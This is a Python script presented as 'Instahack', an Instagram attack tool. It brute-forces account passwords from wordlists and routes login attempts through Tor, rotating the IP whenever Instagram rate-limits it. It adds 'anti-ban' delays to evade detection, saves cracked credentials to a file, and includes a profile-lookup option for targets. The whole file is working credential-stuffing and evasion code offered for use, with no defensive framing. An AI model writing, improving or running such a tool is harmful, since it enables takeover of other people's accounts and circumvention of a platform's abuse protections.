#!/usr/bin/env python3
import os, sys, time, subprocess
from instagrapi import Client
from stem.control import Controller

SMART_ANTIBAN_ENABLED = True
DELAY_BASE = 2

def display_banner():
    print("\n" + "="*60)
    print("🔒 Instahack — Advanced Instagram Attack Tool")
    print("="*60 + "\n")

def change_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='your_password')
            controller.signal('newnym')
        print("[✓] IP changed successfully!")
        time.sleep(5)
    except Exception as e:
        print(f"[!] Error changing IP: {e}")

def save_log(username, password):
    with open('cracked.txt', 'a') as f:
        f.write(f"{username}:{password}\n")

def username_exists(username):
    result = subprocess.run(
        ["instaloader", "--no-download", "--quiet", username],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return result.returncode == 0

def login_with_passwords(username, password_list):
    if not username_exists(username):
        print(f"[✘] User '{username}' does not exist on Instagram. Aborting attack.")
        return False

    delay = DELAY_BASE
    failures = 0
    for pwd in password_list:
        print(f"[+] Trying: {pwd}")
        client = Client()
        client.set_proxy('socks5h://127.0.0.1:9050')
        try:
            client.login(username, pwd)
            print(f"[✔️] Success! Password is: {pwd}")
            save_log(username, pwd)
            return True
        except Exception as e:
            errmsg = str(e).lower()
            if 'facebook' in errmsg:
                print("[!] Account is linked to Facebook login. Skipping this user.")
                return False
            elif 'rate' in errmsg or '429' in errmsg:
                print("[!] Rate limited. Changing IP...")
                change_ip()
                failures = 0
            elif "can't find an account" in errmsg:
                print("[✘] User not found. Aborting attack.")
                return False
            else:
                print(f"[!] Failed: {e}")
                failures += 1
            if SMART_ANTIBAN_ENABLED:
                delay = min(delay + 1, 10) if failures > 3 else delay
                print(f"[~] Delaying {delay}s to avoid ban...")
                time.sleep(delay)
            else:
                time.sleep(DELAY_BASE)
    return False

def gather_osint():
    target = input("Enter username: ")
    try:
        client = Client()
        client.login('sslri', 'your_password')
        user = client.user_info_by_username(target)
        print(f"Username: {user.username}")
        print(f"Bio: {user.biography}")
        print(f"Followers: {user.follower_count}")
    except Exception as e:
        print(f"[!] OSINT failed: {e}")

def load_passwords(path):
    if not os.path.exists(path):
        print("[!] File not found.")
        return []
    with open(path, 'r') as f:
        return [line.strip() for line in f]

def auto_attack():
    username = input("Target username: ")
    pwds = load_passwords("password_list_1.txt")
    login_with_passwords(username, pwds)

def manual_attack():
    username = input("Target username: ")
    path = input("Password list file path: ")
    pwds = load_passwords(path)
    login_with_passwords(username, pwds)

def toggle_antiban():
    global SMART_ANTIBAN_ENABLED
    SMART_ANTIBAN_ENABLED = not SMART_ANTIBAN_ENABLED
    print(f"Smart Anti-Ban is now {'ON' if SMART_ANTIBAN_ENABLED else 'OFF'}")

def update_tool():
    os.system("git pull origin main")

def main():
    display_banner()
    while True:
        print("1. Gather OSINT")
        print("2. Auto Attack")
        print("3. Manual Attack")
        print("4. Toggle Smart Anti-Ban")
        print("5. Update Tool")
        print("6. Exit\n")
        choice = input("Choose option: ").strip()
        if choice == '1':
            gather_osint()
        elif choice == '2':
            auto_attack()
        elif choice == '3':
            manual_attack()
        elif choice == '4':
            toggle_antiban()
        elif choice == '5':
            update_tool()
        elif choice == '6':
            break
        else:
            print("[!] Invalid option")

if __name__ == "__main__":
    main()
